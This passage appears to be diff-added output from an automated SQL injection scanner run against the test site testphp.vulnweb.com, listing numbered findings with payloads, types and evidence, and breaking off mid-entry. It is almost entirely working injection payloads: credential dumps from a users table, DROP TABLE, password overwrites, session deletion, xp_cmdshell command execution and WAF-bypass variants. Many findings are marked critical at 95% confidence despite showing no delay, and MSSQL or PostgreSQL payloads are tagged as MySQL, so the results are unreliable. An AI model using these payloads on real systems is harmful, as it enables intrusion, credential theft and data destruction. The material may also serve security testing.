+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND SUBSTRING(@@version,1,1)='5'--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[93] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND SUBSTRING(@@version,1,1)='4'--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[94] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND ASCII(SUBSTRING(database(),1,1))>64--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[95] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND ASCII(SUBSTRING(database(),1,1))<64--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[96] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND (SELECT COUNT(*) FROM users)>0--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[97] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND (SELECT COUNT(*) FROM users)=0--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[98] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND LENGTH(database())>5--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[99] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND LENGTH(database())<5--
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[100] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR '1'='1' AND '1'='2
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[101] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR '1'='1' AND '1'='1
+    Type: boolean_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[102] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; WAITFOR DELAY '0:0:5'--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.026s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[103] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[104] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR SLEEP(5)#
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[105] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: " OR SLEEP(5)#
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[106] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND SLEEP(5)#
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[107] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND SLEEP(5)#
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[108] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT pg_sleep(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[109] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR pg_sleep(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[110] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[111] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND BENCHMARK(5000000,MD5('test'))--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[112] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' RLIKE SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.013s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[113] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[114] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' waitfor delay '0:0:5'--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[115] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1)) waitfor delay '0:0:5'--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[116] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; WAITFOR DELAY '0:0:10'--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[117] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[118] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1) AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[119] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ') AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[120] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ") AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[121] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1')) AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[122] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1")) AND SLEEP(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[123] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' AND (SELECT SLEEP(5) FROM DUAL)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[124] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1;SELECT IF(1=1,SLEEP(5),0)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[125] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ';SELECT IF(1=1,SLEEP(5),0)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.022s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[126] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' OR IF(1=1,SLEEP(5),0)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[127] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    Type: time_based
+    Database: unknown
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 5.015s
+    Evidence: Response delayed by 5.01s
+
+[128] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: pg_sleep(5)--
+    Type: time_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: Response length changed by 66.9%
+
+[129] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' || pg_sleep(5)--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[130] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; SELECT pg_sleep(5);--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[131] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT pg_sleep(5);--
+    Type: time_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[132] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[133] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[134] HIGH - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 AND SLEEP(5)
+    Type: time_based
+    Database: unknown
+    Confidence: 85%
+    Response Code: 200
+    Response Time: 5.021s
+    Evidence: Response delayed by 5.02s
+
+[135] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.029s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[136] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL,NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[137] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[138] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 UNION SELECT NULL--
+    Type: union_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: Response length changed by 66.6%
+
+[139] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 UNION SELECT NULL,NULL--
+    Type: union_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: Response length changed by 66.6%
+
+[140] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 UNION ALL SELECT NULL--
+    Type: union_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: Response length changed by 66.6%
+
+[141] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION ALL SELECT NULL,NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[142] MEDIUM - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1 UNION ALL SELECT NULL,NULL--
+    Type: union_based
+    Database: unknown
+    Confidence: 60%
+    Response Code: 200
+    Response Time: 0.028s
+    Evidence: Response length changed by 66.6%
+
+[143] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT 1,2,3--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.020s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[144] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT 1,2,3,4--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[145] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT 1,2,3,4,5--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[146] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT @@version--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[147] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT user()--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[148] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT database()--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[149] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT @@version,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[150] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT user(),NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[151] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT database(),NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[152] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT table_name,NULL FROM information_schema.tables--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[153] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT column_name,NULL FROM information_schema.columns--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[154] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT concat(username,':',password) FROM users--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[155] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT username,password FROM users--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[156] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[157] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[158] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1' UNION SELECT NULL,NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[159] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1) UNION SELECT NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[160] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1') UNION SELECT NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[161] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1") UNION SELECT NULL,NULL--
+    Type: union_based
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[162] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT 1--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[163] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT @@version--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[164] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; SELECT user()--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[165] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; INSERT INTO log VALUES('injected')--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[166] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DROP TABLE test--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[167] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; UPDATE users SET password='hacked'--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[168] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DELETE FROM sessions--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[169] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; SELECT 1--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[170] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1; DROP TABLE test--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[171] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1'; SELECT 1--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[172] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1'); SELECT 1--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[173] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: 1"); SELECT 1--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[174] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC xp_cmdshell('whoami')--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[175] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; EXEC master..xp_cmdshell 'dir'--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.014s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[176] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DECLARE @x NVARCHAR(100); SET @x='test'; EXEC(@x)--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[177] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; BEGIN SELECT 1 END--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[178] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: '; DECLARE @q NVARCHAR(4000);SET @q='SELECT 1';EXEC(@q)--
+    Type: stacked_queries
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.019s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[179] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' /*!50000OR*/ 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.018s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[180] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %00OR 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.015s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[181] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' /*!OR*/ 1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.021s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[182] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %09OR%091=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.016s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[183] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
+    Payload: ' %0aOR%0a1=1--
+    Type: waf_bypass
+    Database: mysql
+    Confidence: 95%
+    Response Code: 200
+    Response Time: 0.017s
+    Evidence: SQL syntax; check the manual that corresponds to your MySQL
+
+[184] CRITICAL - artist
+    URL: http://testphp.vulnweb.com/artists.php?artist=1
+    Parameter: artist
